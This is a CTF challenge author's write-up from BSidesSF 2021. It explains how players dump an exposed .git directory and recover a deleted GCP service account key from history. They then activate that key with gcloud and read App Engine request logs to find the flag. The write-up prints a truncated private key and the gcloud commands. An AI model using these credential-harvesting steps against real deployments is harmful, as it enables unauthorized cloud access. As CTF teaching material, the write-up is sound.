# :locked_with_key: Challenge writer POV: BSidesSF 2021 CTF (Cloud)

---

## Shout into the void

This challenge explored what an attacker could do with a leaked GCP Service Account Key. Players were directed to visit a web application on App Engine which claimed to allow users to share their thoughts freely without trace.

I hinted to the presence of a .git directory through robots.txt,

```
User-agent: *
Disallow: /.git/*
```

There are a number of tools available to retrieve git repositories including the nmap script [http-git](https://nmap.org/nsedoc/scripts/http-git.html) and internetwache’s [GitDumper](https://github.com/internetwache/GitTools/tree/master/Dumper). Once the player retrieves the repository, they can run git log/ git show to examine the current state.

```
> git log
commit 8170c6c35cccffe0f9e2715fd7b81c832e5d9fd1 (HEAD -> master)
Author: corgi <corgi@corgiwoofwoof.com>
Date: Fri Mar 5 19:55:42 2021 -0800clean up completecommit 543e9d358dbd4276da5277291624d16fb8b9d56a
Author: corgi <corgi@corgiwoofwoof.com>
Date: Fri Mar 5 19:55:00 2021 -0800remove this later> git show
commit 8170c6c35cccffe0f9e2715fd7b81c832e5d9fd1 (HEAD -> master)
Author: corgi <corgi@corgiwoofwoof.com>
Date: Fri Mar 5 19:55:42 2021 -0800clean up completediff --git a/booming-cosine-304921-5327fdaff786.json b/booming-cosine-304921-5327fdaff786.json
deleted file mode 100644
index a440f42..0000000
--- a/booming-cosine-304921-5327fdaff786.json
+++ /dev/null
@@ -1,12 +0,0 @@
-{
- "type": "service_account",
- "project_id": "booming-cosine-304921",
- "private_key_id": "5327fdaff786b034f9dc37834326fd83dfa1d972",
- "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG...
```

The commit message “clean up complete” should indicate that there was a file that was removed. Viewing the previous commit, will reveal that a service account key was checked-in and deleted. Plugging this into gcloud shows that key is still active,

```
gcloud auth activate-service-account --key-file=key.json --project=booming-cosine-304921
```

The players needed to figure out what permissions the key had, given that it didn’t have the permission to list permissions the only way to go about this was to try [different commands](https://cloud.google.com/sdk/docs/cheatsheet). This would enable them to determine that the key had read access to logs, most notably the App Engine’s request logs.

```
> gcloud logging logs list
NAME
projects/example-project/logs/%2Fvar%2Flog%2Fgoogle_init.log
projects/example-project/logs/%2Fvar%2Flog%2Fnginx%2Ferror.log
projects/example-project/logs/appengine.googleapis.com%2Frequest_log
projects/example-project/logs/cloudaudit.googleapis.com%2Factivity
projects/example-project/logs/cloudaudit.googleapis.com%2Fdata_access
projects/example-project/logs/cloudaudit.googleapis.com%2Fsystem_event
projects/example-project/logs/cloudbuild
projects/example-project/logs/clouderrorreporting.googleapis.com%2Finsights
projects/example-project/logs/stderr
projects/example-project/logs/varlog%2Fsystem> gcloud logging read request_log> gcloud logging read request_log | grep flag
resource: /send?message=https%3A%2F%2Fstorage.googleapis.com%2Fshout-into-void%2F1574AB2CB00533975094D87814BCF8FA707FD608-flag.txt
```

Looking through the logs, players will notice a repeated message being posted which linked to a *-flag.txt on a GCS bucket. This world-readable file contained the flag — CTF{Aud1t_th3_l0g5}. Unfortunately, some players were spamming messages in the flag format (CTF{}) requiring me to more aggressively spam the link to the flag using a cron job. Overall, this challenge was solved 27 times and received a lot of positive feedback over chat. Some players remarked that the bruteforcing aspect was cumbersome, but I want to reiterate that this is how you would enumerate permissions for Service Account keys in the real world when you cannot list their permissions through IAM. If you are interested in learning more about Service Account Keys, I highly recommend Dylan Ayrey and Allison Donovan’s Defcon talk on [Lateral Movement and Privilege Escalation in GCP](https://www.youtube.com/watch?v=Z-JFVJZ-HDA).

A big shout-out to [Mandatory](https://twitter.com/iammandatory) for the brainstorming and challenge writing support.

---
